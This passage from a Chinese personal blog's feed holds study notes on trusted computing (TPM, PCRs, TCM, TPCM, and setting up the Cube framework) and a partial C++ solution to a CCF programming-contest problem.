Hackbench 等基准甚至性能提升，归因于免除虚拟化开销。</p><h1 id="HyperEnclave-An-Open-and-Cross-platform-Trusted-Execution-Environment">HyperEnclave: An Open and Cross-platform Trusted Execution Environment</h1><p>这是一篇关于构造硬件通用的进程级可信执行环境TEE的文章，刚好跟我们项目中的一个点对应上，也是我之前觉得特别难的一个点，由此做个记录。</p><h2 id="Abstract-4">Abstract</h2>]]></content>
    
    
    
    <tags>
      
      <tag>可信计算</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>可信计算学习</title>
    <link href="/2024/11/19/%E5%8F%AF%E4%BF%A1%E8%AE%A1%E7%AE%97%E5%AD%A6%E4%B9%A0/"/>
    <url>/2024/11/19/%E5%8F%AF%E4%BF%A1%E8%AE%A1%E7%AE%97%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="总结的可信计算">总结的可信计算</h1><h1 id="可信计算概念">可信计算概念</h1><p>以PC机可信举例，通俗来讲，可信就是在每台PC机启动时检测BIOS和操作系统的完整性和正确性，保障你在使用PC时硬件配置和操作系统没有被篡改过，所有系统的安全措施和设置都不会被绕过；在启动后，对所有的应用，如社交软件、音乐软件、视频软件等应用可进行实时监控，若发现应用被篡改立即采取止损措施。</p><p>以杀毒软件、防火墙、入侵检测为代表的传统“老三样”防御系统，需要预先捕捉黑客攻击和病毒入侵的特征信息，属于“事后防御”的“黑名单”机制，难以应对这种未知的恶意攻击。而可信计算作为一种“白名单”机制，类似人体的主动免疫系统，通过区分“自己”和“非己”成分，可及时清除各类未知风险。</p><p>此外，传统的安全防护机制往往运行在应用层或操作系统层，是“自上而下”的保护，一旦启动过程中系统被植入了Rootkit/BootKit或恶意固件，这些位于启动链末端的安全防护机制可能完全无法生效。</p><h2 id="什么是Rootkit">什么是Rootkit</h2><p>1985年，美国国防部发布了世界上第一个可信计算标准——《可信计算机系统评价标准》（TCSEC，即著名的“橘皮书”），第一次提出了可信计算基（Trusted Computing Base, TCB）的概念，并把TCB作为信息系统安全的基础。</p><p>截止到目前，国际上已形成以TPM芯片为信任根的TCG标准系列，国内已形成以TCM芯片为信任根的双体系架构可信标准系列。</p><p>国际与国内两套标准最主要的差异为：</p><ul><li><p>信任芯片是否支持国产密码算法，国家密码局主导提出了中国商用密码可信计算应用标准，并禁止加载国际算法的可信计算产品在国内销售；</p></li><li><p>信任芯片是否支持板卡层面的优先加电控制，国内部分学者认为国际标准提出的CPU先加电、后依靠密码芯片建立信任链的模式强度不够，为此，提出基于TPCM芯片的双体系计算安全架构，TPCM芯片除了密码功能外，必须先于CPU加电，先于CPU对BIOS进行完整性度量；</p></li><li><p>可信软件栈是否支持操作系统层面的透明可信控制，国内部分学者认为国际标准需要程序被动调用可信接口，不能在操作系统层面进行主动度量，为此，提出在操作系统内核层面对应用程序完整性和程序行为进行透明可信判定及控制思路。</p></li></ul><h1 id="可信计算的基本思想">可信计算的基本思想</h1><p>信任的获得方法主要有直接和间接两种。设A和B以前有过交往，则A对B的可信度可以通常考察B以往的表现来确定，我们称这种通过直接交往得到的信任值为直接信任值。设A和B以前没有任何交往，但A信任C，并且C信任B，那么此时我们称A对B的信任为间接信任。有时还可能出现多级间接信任的情况，这时便产生了信任链。</p><p>在计算平台中，首先创建一个安全信任根，再建立从硬件平台、操作系统到应用系统的信任链，在这条信任链上从根开始一级度量验证一级，一级信任一级，以此实现信任的逐级扩展，从而构建一个安全可信的计算环境。一个可信计算系统由信任根、可信硬件平台、可信操作系统和可信应用组成，其目标是提高计算平台的安全性。</p><h2 id="TCG的信任链">TCG的信任链</h2><p><strong>CRTM → BIOS/UEFI → OS Loader → OS → Applications</strong>，每个阶段逐步建立起一个可信的链条。这被称为<strong>静态信任链（Static Chain of Trust）</strong>，是可信计算中的一个典型实现。</p><p>具体来说：</p><p><strong>CRTM（Core Root of Trust for Measurement）</strong></p><ul><li><strong>作用</strong>：信任链的起点，是第一个被执行并测量的可信代码。</li><li><strong>特点</strong>：通常嵌入硬件或固件中，负责测量系统启动时的关键数据（例如BIOS的哈希值）。</li><li><strong>实现方式</strong>：这部分代码通常是不可更改的，比如存储在只读存储器（ROM）或固件中。</li><li><strong>输出</strong>：将测量结果存储在TPM的PCR（Platform Configuration Register）中。</li></ul><p><strong>BIOS/UEFI（Basic Input/Output System/Unified Extensible Firmware Interface）</strong></p><ul><li><strong>作用</strong>：初始化硬件，加载并测量下一阶段的启动程序（OS Loader）。</li><li><strong>特点</strong>：BIOS/UEFI在启动过程中会对其自身和引导加载器进行测量。</li><li><strong>输出</strong>：将这些测量结果记录在TPM中。</li></ul><p><strong>OS Loader（操作系统加载器）</strong></p><ul><li><strong>作用</strong>：加载操作系统内核，并对其进行测量和验证。</li><li><strong>特点</strong>：比如，常见的加载器如GRUB或Windows Boot Manager会被测量，以确保未被篡改。</li><li><strong>输出</strong>：将测量结果存储在TPM中，作为后续验证的基础。</li></ul><p><strong>OS（操作系统）</strong></p><ul><li><strong>作用</strong>：在加载并完成自检后，操作系统会继续测量关键组件（如内核模块、配置文件）。</li><li><strong>特点</strong>：操作系统还可以调用TPM验证前面阶段的可信状态，以确保整个链条的完整性。</li></ul><p><strong>Applications（应用程序）</strong></p><ul><li><strong>作用</strong>：某些关键应用程序（如安全软件、加密模块）也可以基于操作系统的信任链，对自身或其他应用进行度量和验证。</li><li><strong>特点</strong>：这部分通常由具体的应用场景决定，比如在云计算中，虚拟机管理程序（Hypervisor）可能会成为额外的一环。</li></ul><h1 id="信任根">信任根</h1><p>TCG（Trusted Computing Group）定义的信任根（Root of Trust, RoT） 是指在计算机系统或设备中，用于支持安全操作的一个可信赖的硬件或软件基础。它是系统可信计算的基础，提供了一组核心功能，帮助验证和保护系统的安全性。主要包括以下三个核心组件，每个组件具有特定的功能，是建立可信计算环境的基础：</p><h2 id="可信度量根（RTM）">可信度量根（RTM）</h2><ul><li><strong>全称</strong>：Root of Trust for Measurement</li><li><strong>功能</strong>：负责对系统关键组件和启动代码进行测量（通常指哈希计算），生成用于验证的可信度量值。这是可信链的起点，通常在系统启动时由固件或硬件实现。</li></ul><h2 id="可信存储根（RTS）">可信存储根（RTS）</h2><ul><li><strong>全称</strong>：Root of Trust for Storage</li><li><strong>功能</strong>：用于安全存储敏感信息，例如密钥、度量值和配置数据。它通常依赖于硬件模块（如TPM）来保护这些数据免受篡改或未授权访问。</li></ul><h2 id="可信报告根（RTR）">可信报告根（RTR）</h2><ul><li><strong>全称</strong>：Root of Trust for Reporting</li><li><strong>功能</strong>：负责安全报告系统状态和度量值，确保这些数据的真实性和完整性，用于向外部验证方证明设备或平台的可信状态。</li></ul><h2 id="打个比方">打个比方</h2><p>这样说起来比较抽象，理解比较困难，但实际上这么分很清晰。</p><p>想象你的电脑是一个“保险箱”，信任根就是负责确保这个“保险箱”足够安全的部分</p><ul><li><strong>RTM（可信度量根）</strong>：好比一个“安检仪器”，每次你启动保险箱时，它会扫描检查锁、门和密码系统有没有被改动。</li><li><strong>RTS（可信存储根）</strong>：就像保险箱里的“秘密隔间”，里面放着你的重要文件（密钥、密码等），确保没有人能偷走或篡改这些文件。</li><li><strong>RTR（报可信报告根）</strong>：像一个“报警器”，当有人试图打开你的保险箱时，它会告诉你（或别人）当前保险箱是否安全，是否被动过手脚。</li></ul><h1 id="可信平台模块（TPM）">可信平台模块（TPM）</h1><p>**可信平台模块（Trusted Platform Module, TPM）**是可信计算平台的信任根，是一种计算机芯片（微控制器）。该芯片的规格由可信计算组（Trusted Computing Group）来制定。</p><h2 id="TPM的组件">TPM的组件</h2><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/4B9C7BAD-1D09-3519-AD3C14521816BC05.jpg" alt="4B9C7BAD-1D09-3519-AD3C14521816BC05"></p><h2 id="TPM-2-0内部结构及模块功能">TPM 2.0内部结构及模块功能</h2><p>TCG先后发布过多个版本的TPM标准，其中，TPM 1.2使用较为广泛，但随着信息计算机技术的不断发展，TPM 1.2无法满足新技术下的需求，2014 TCG发布了TPM 2.0，TPM 2.0内部结构及模块功能如下图：<br><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241120102508022.png" alt="image-20241120102508022"></p><h2 id="平台配置寄存器（PCR）">平台配置寄存器（PCR）</h2><p>**平台配置寄存器（Platform Configuration Register, PCR）**是TPM芯片的基本组成部分之一，它的主要用途是提供一种基于密码学的度量软件状态的方法，度量对象包括平台上运行的软件和该软件使用的配置数据。</p><p>TPM在上电时会将所有PCR初始化为全0或全1（根据TPM平台规定的初始状态），调用者不能直接写PCR，只能通过被称为**“扩展”（Extend）**的操作更新PCR的值，这是一种单向哈希计算，其定义如下：</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>P</mi><mi>C</mi><msub><mi>R</mi><mrow><mi>n</mi><mi>e</mi><mi>w</mi></mrow></msub><mo>=</mo><mi>h</mi><mi>a</mi><mi>s</mi><mi>h</mi><mo stretchy="false">(</mo><mi>P</mi><mi>C</mi><mi>R</mi><mi mathvariant="normal">∣</mi><mi mathvariant="normal">∣</mi><mtext>扩展数据</mtext><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">PCR_{new}=hash(PCR||扩展数据)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">PC</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0077em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mord mathnormal mtight">e</span><span class="mord mathnormal mtight" style="margin-right:0.02691em;">w</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">ha</span><span class="mord mathnormal">s</span><span class="mord mathnormal">h</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.00773em;">PCR</span><span class="mord">∣∣</span><span class="mord cjk_fallback">扩展数据</span><span class="mclose">)</span></span></span></span></span></p><p>典型的PCR分配如下：</p><table><thead><tr><th>PCR编号</th><th>用途</th></tr></thead><tbody><tr><td>0</td><td>BIOS</td></tr><tr><td>1</td><td>BIOS配置</td></tr><tr><td>2</td><td>可选ROM</td></tr><tr><td>3</td><td>可选ROM配置</td></tr><tr><td>4</td><td>MBR</td></tr><tr><td>5</td><td>MBR配置</td></tr><tr><td>6</td><td>状态转变和唤醒事件</td></tr><tr><td>7</td><td>平台制造商特定度量</td></tr><tr><td>8-15</td><td>静态操作系统</td></tr><tr><td>16</td><td>Debug</td></tr><tr><td>23</td><td>应用程序支持</td></tr></tbody></table><h2 id="TPM1-2与2-0对比">TPM1.2与2.0对比</h2><table><thead><tr><th>对比项</th><th>TPM 1.2</th><th>TPM 2.0</th></tr></thead><tbody><tr><td>平台支持</td><td>主要面向PC平台设计，不适合服务器平台和嵌入式平台</td><td>面向多平台</td></tr><tr><td>本地化</td><td>密码方案不支持本地化，不利于向世界各国推广</td><td>支持不同国家使用自己的标准<a href="https://zhida.zhihu.com/search?content_id=227470635&amp;content_type=Article&amp;match_order=1&amp;q=%E5%AF%86%E7%A0%81%E7%AE%97%E6%B3%95&amp;zhida_source=entity">密码算法</a>，例如我国的TPM 2.0芯片支持SM2、SM3和SM4国密算法</td></tr><tr><td>PCR</td><td>只能使用SHA-1算法进行PCR扩展</td><td>拥有多个PCR banks，一个bank内所有PCR使用相同算法进行扩展操作，对于不同的bank，扩展操作相互独立，互不干扰</td></tr></tbody></table><h1 id="可信密码模块（TCM）">可信密码模块（TCM）</h1><p>**可信密码模块（trusted cryptography module,TCM）**是可信计算平台的硬件模块，为可信计算平台提供密码运算功能，具有受保护的存储空间，是我国国内研究，与TPM对应。但定位不同，TCG组织将TPM定位为系统的可信根。但是TCM定位为可信平台中专用于提供可信密码服务的模块，是可信根的重要组成部分。</p><h2 id="结构与功能">结构与功能</h2><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241120111814500.png" alt="image-20241120111814500"></p><h1 id="可信平台控制模块-TPCM">可信平台控制模块(TPCM)</h1><h2 id="功能描述">功能描述</h2><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241120112236449.png" alt="image-20241120112236449"></p><h1 id="可信软件栈（TSS）">可信软件栈（TSS）</h1><h1 id="参考文献">参考文献</h1><p>[1] <a href="https://blog.csdn.net/qq_35481726/article/details/124704377">【可信计算】第五次课：可信计算规范与标准_tpm2 隐私域-CSDN博客</a></p><p>[2] <a href="https://www.sohu.com/a/256818986_653604/">网络安全之可信计算_计算机</a></p><p>[3] <a href="https://blog.csdn.net/xy010902100449/article/details/122286055">看见“信任”，可信计算平台的由来解读（TPM、TCM、TPCM、等保2.0解读）。-CSDN博客</a></p><p>[4] <a href="https://blog.csdn.net/xiaoju14/article/details/109717146">TCM、TPM、TPCM-CSDN博客</a></p><p>[5] <a href="https://zhuanlan.zhihu.com/p/627026294">可信计算的前世今生 - 知乎</a></p><p>[6] [可信平台控制模块（TPCM） | openEuler文档 | openEuler社区 | v24.09](<a href="https://docs.openeuler.org/zh/docs/24.09/docs/Administration/%E5%8F%AF%E4%BF%A1%E5%B9%B3%E5%8F%B0%E6%8E%A7%E5%88%B6%E6%A8%A1%E5%9D%97TPCM.html#:~:text=%E5%8F%AF%E4%BF%A1%E5%B9%B3%E5%8F%B0%E6%8E%A7%E5%88%B6%E6%A8%A1%E5%9D%97%EF%BC%88Trusted">https://docs.openeuler.org/zh/docs/24.09/docs/Administration/可信平台控制模块TPCM.html#:~:text=可信平台控制模块（Trusted</a> Platform,Control Module，TPCM）是一种可集成在可信计算平台中，用于建立和保障信任源点的基础核心模块。 它作为中国可信计算3.0中的创新点之一和主动免疫机制的核心，实现了对整个平台的主动可控。)</p><p>[7] <a href="https://trustedcomputinggroup.org/resource/trusted-platform-module-tpm-summary/">可信平台模块 （TPM） 摘要 |可信计算组</a></p><p>注：部分图片来源于网络，如有侵权请邮箱联系。</p><h1 id="可信计算书籍阅读笔记">可信计算书籍阅读笔记</h1><h1 id="可信计算理论与技术">可信计算理论与技术</h1><p>本章为阅读《可信计算理论与技术》的阅读笔记。</p><h2 id="可信计算技术">可信计算技术</h2><h3 id="可信计算概论">可信计算概论</h3><h4 id="初识可信计算">初识可信计算</h4><p>可信计算的核心就是要建立一种信任机制，用户信任计算机，计算机信任用户，用户在操作计算机时需要证明自己的身份，计算机在为用户服务时也要验证用户的身份。这样一种理念来自于人们所处的社会生活。</p><p>近年来，体现整体安全的可信计算技术越来越受到人们的关注，这正是因为它有别于传统的安全技术，试图从根本上解决安全问题。</p><h4 id="可信计算定义与关键技术">可信计算定义与关键技术</h4><p>可信计算的一些基本概念：</p><ol><li><p>可信计算基</p><p>可信计算基（<code>TCB</code>，Trusted Computing Base）是计算机系统内保护装置的总体，包括硬件、固件、软件和负责执行安全策略的组合体。通常所指的<code>TCB</code>是构成安全计算机信息系统的所有安全保护装置的组合体（通常称为安全子系统），以防止不可信主体的干扰和篡改。</p></li><li><p>可信计算平台</p><p>平台是一种能向用户发布信息或从用户那里接收信息的实体。可信计算平台基于<code>TPM</code>，以密码技术为支持、安全操作系统为核心。安全操作系统是可信计算平台的核心和基础，没有安全的操作系统，就没有安全的应用，也不能使<code>TPM</code>发挥应有的作用。</p></li><li><p>可信根和可信链</p><p>可信根和信任链是可信计算平台的核心关键技术。一个可信计算机系统由可信根、可信硬件平台、可信操作系统和可信应用组成。信任链是通过构建一个可信根，从可信根开始到硬件平台、到操作系统、再到应用，一级认证一级，一级信任一级，从而把这种信任扩展到整个计算机系统，可信根的可信性由物理安全和管理安全确保。</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241126211348243.png" alt="image-20241126211348243"></p></li></ol><p><strong>可信计算的定义与原理</strong></p><ul><li><p>可信计算的定义：</p><p>可信计算学术界对可信的统一认识为：可信计算是指计算的同时进行安全防护，使计算结果总是与预期一样，计算全程可测可控，不被干扰。</p></li><li><p>可信计算的原理</p><p>可信计算的原理是通过硬件可信根对系统的启动和运行状态进行度量和验证，形成一条完整的信任链，以确保系统处于可验证的可信状态。</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241126204237201.png" alt="image-20241126204237201"></p></li></ul><p><strong>可信计算技术体系</strong></p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241126211726702.png" alt="image-20241126211726702"></p><ul><li><p>可信根（Root of Trust，<code>RoT</code>）是最基础的可信部件，是系统可信的源头，既具备安全功能又具备可信功能，且不需要其他机制提供安全支撑的底层机制。在除可信3.0外的可信框架中，可信根以可信平台模块(Trusted Platform Module，<code>TPM</code>)为基础。</p></li><li><p>可信平台（Trusted Platform，<code>TP</code>）是实现可信计算功能的设备或系统。</p></li><li><p>可信软件栈（Trusted Software Stack, <code>TSS</code>）是可信计算体系中的一组软件接口和工具，它将可信硬件（如<code>TPM</code>）的功能暴露给操作系统和应用程序，以便它们能够调用和管理这些功能。</p></li><li><p>可信网络连接（Trusted Network Connection, <code>TNC</code>）是一种网络安全框架，旨在确保只有经过可信验证的设备和系统才能接入网络，防止不受信任或被攻陷的设备威胁网络安全。</p></li></ul><p>嵌有<code>TPM</code>的平台被称作可信计算平台。</p><p><strong>可信平台模块（<code>TPM</code>）</strong></p><p><code>TPM</code>通过可信软件栈（<code>TSS</code>）为可信计算平台上的应用程序提供完整性度量、存储和报告，远程证明，数据保护和密钥管理4大核心功能。</p><h2 id="可信平台模块（TPM）-2">可信平台模块（TPM）</h2><h3 id="概述">概述</h3><h1 id="可信计算工程初步">可信计算工程初步</h1><p>本章为阅读《可信计算3.0工程初步（第二版）》的阅读笔记。</p><h2 id="概述-2">概述</h2><h3 id="什么是可信计算">什么是可信计算</h3><h3 id="可信计算发展过程">可信计算发展过程</h3><h4 id="可信3-0的应用模式">可信3.0的应用模式</h4><h4 id="可信机制">可信机制</h4><h4 id="可信策略">可信策略</h4><h4 id="可信保障">可信保障</h4><h2 id="可信计算基本概念">可信计算基本概念</h2><h3 id="可信根和可信链">可信根和可信链</h3><h4 id="可信根">可信根</h4><h4 id="可信链">可信链</h4><h3 id="可信密码服务">可信密码服务</h3><h4 id="可信存储">可信存储</h4><h4 id="可信度量">可信度量</h4><h4 id="可信报告和可信认证">可信报告和可信认证</h4><h3 id="可信部件">可信部件</h3><h4 id="可信密码模块（TCM）-2">可信密码模块（TCM）</h4><h4 id="可信平台控制芯片（TPCM）">可信平台控制芯片（TPCM）</h4><h4 id="可信主板">可信主板</h4><h4 id="可信软件基">可信软件基</h4><h4 id="可信网络连接">可信网络连接</h4><h3 id="可信体系架构">可信体系架构</h3><h2 id="可信软件基框架原型Cube">可信软件基框架原型Cube</h2><h3 id="Cube介绍">Cube介绍</h3><h3 id="开发流程">开发流程</h3><h3 id="Cube实例">Cube实例</h3><h4 id="Linux环境准备">Linux环境准备</h4><p>Ubuntu16.04</p><p>调试工具gbd</p><p>gcc、make等工具包</p><h4 id="Cube基本环境编辑">Cube基本环境编辑</h4><p>下载Cube</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/biparadox/cube-1.3<br></code></pre></td></tr></table></figure><p>这个指令无法成功下载，原因暂未知，直接从官网下压缩文件然后解压吧</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">unzip cube-1.3-master.zip -d cube<br><span class="hljs-built_in">mv</span> cube/cube-1.3-master cube-1.3<br><span class="hljs-built_in">rm</span> -rf cube<br></code></pre></td></tr></table></figure><p>查看文件夹内部</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> cube-1.3/<br><span class="hljs-built_in">ls</span><br></code></pre></td></tr></table></figure><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241121150949203.png" alt="image-20241121150949203"></p><p>其中set_env.sh和env_build.sh为环境变量设置和编译脚本，<br>cubelib为cube架构内部库的源码目录，<br>proc目录下为cube架构的主程序和一组通用模块的源码，<br>include为模块开发时可使用的库函数列表，<br>example目录下则是示例实例。</p><p>环境变量配置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vi set_env.sh<br></code></pre></td></tr></table></figure><p>此处改成set_env.sh所在位置，注意需要去掉引号</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241123193206034.png" alt="image-20241123193206034"></p><p>随后执行source set_env.sh命令,完成编译环境设置。</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241123194329813.png" alt="image-20241123194329813"></p><p>使用命令查看系统中Cube环境相关变量的配置情况</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">env</span>| grep CUBE<br></code></pre></td></tr></table></figure><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241123195730480.png" alt="image-20241123195730480"></p><p>系统每次进入开发环境都需要执行本脚本，可以在用户目录的.bashrc文件最后添加如下命令，以使其每次都能自动完成设置。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">source</span> /home/syz/cube-1.3/set_env.sh<br></code></pre></td></tr></table></figure><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241123195415284.png" alt="image-20241123195415284"></p><p>编译Cube的基本库函数</p><p>进入cube-1.3目录下的cubelib目录，执行ls查看，并在该目录下执行make。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> cubelib<br><span class="hljs-built_in">ls</span><br>make<br></code></pre></td></tr></table></figure><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241123200030913.png" alt="image-20241123200030913"></p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241123200130468.png" alt="image-20241123200130468"></p><p>编译成功后，进入proc目录下。proc 目录包含Cube 的主程序、系统子块、一些示例子模块与常用的功能子模块。执行ls命令查看，可看到如下结果。</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241123200853407.png" alt="image-20241123200853407"></p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241123200918741.png" alt="image-20241123200918741"></p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241123201021009.png" alt="image-20241123201021009"></p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241123201108286.png" alt="image-20241123201108286"></p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241123201156318.png" alt="image-20241123201156318"></p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241123201628927.png" alt="image-20241123201628927"></p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241123201713814.png" alt="image-20241123201713814"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> dmidecode | grep UUID<br></code></pre></td></tr></table></figure><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241123201258216.png" alt="image-20241123201258216"></p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241123201447471.png" alt="image-20241123201447471"></p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241123201833053.png" alt="image-20241123201833053"></p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241123201914784.png" alt="image-20241123201914784"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> cube_audit.log<br></code></pre></td></tr></table></figure><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241123202056503.png" alt="image-20241123202056503"></p><h3 id="最简单的Cube实例">最简单的Cube实例</h3>]]></content>
    
    
    
    <tags>
      
      <tag>可信计算</tag>
      
      <tag>TPM</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ccf刷题记录</title>
    <link href="/2024/03/21/ccf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    <url>/2024/03/21/ccf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h1 id="2023年">2023年</h1><h2 id="202309-2-坐标变换（其二）">202309-2 坐标变换（其二）</h2><p>这个题目前80分不难拿，数据量也比较小，后面二十分的数据会比较多。</p><p>我最开始就只是用暴力就写了，用俩数组存操作和数据，然后每轮遍历操作，分情况计算结果即可。但是这样过不了另外的20%，之后想到了或许能用前缀和，一串相同操作的数据就给编写到前缀和里，我一开始以为操作的先后顺序会影响到结果，所以以为必须要知道前缀和的长度是从哪到哪，所以也没写出来，但是之后发现虽然计算的顺序确实不一样了，但是逻辑上讲结果是一样的，因此还是可以使用前缀和的：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;math.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> n,m;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d %d&quot;</span>,&amp;n,&amp;m);<br>    <span class="hljs-type">int</span> op;<br>    <span class="hljs-type">double</span> k[<span class="hljs-number">100010</span>],tangle[<span class="hljs-number">100010</span>],data;<br>    <span class="hljs-built_in">memset</span>(k,<span class="hljs-number">1</span>,<span class="hljs-built_in">sizeof</span>(k));<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++)<br>    &#123;<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d %lf&quot;</span>,&amp;op,&amp;data);<br>        <span class="hljs-keyword">if</span>(op==<span class="hljs-number">2</span>)<br>        &#123;<br>            tangle[i]=tangle[i<span class="hljs-number">-1</span>]+data;<br>            k[i]=k[i<span class="hljs-number">-1</span>];<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            k[i]=k[i<span class="hljs-number">-1</span>]*data;<br>            tangle[i]=tangle[i<span class="hljs-number">-1</span>];<br>        &#125;<br>    &#125;<br>    <span class="hljs-type">int</span> i,j;<br>    <span class="hljs-type">double</span> x,y;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> b = <span class="hljs-number">0</span>; b &lt; m; b++)<br>    &#123;<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d %d %lf %lf&quot;</span>,&amp;i,&amp;j,&amp;x,&amp;y);<br>        <span class="hljs-type">double</span> k_m=k[j]/k[i<span class="hljs-number">-1</span>];<br>        <span class="hljs-type">double</span> tangle_m=tangle[j]-tangle[i<span class="hljs-number">-1</span>];<br>        <span class="hljs-type">double</span> xx=(x*<span class="hljs-built_in">cos</span>(tangle_m)-y*<span class="hljs-built_in">sin</span>(tangle_m))*k_m;<br>        <span class="hljs-type">double</span> yy=(x*<span class="hljs-built_in">sin</span>(tangle_m)+y*<span class="hljs-built_in">cos</span>(tangle_m))*k_m;<br>        <span class="hljs-built_in">printf</span>(<span 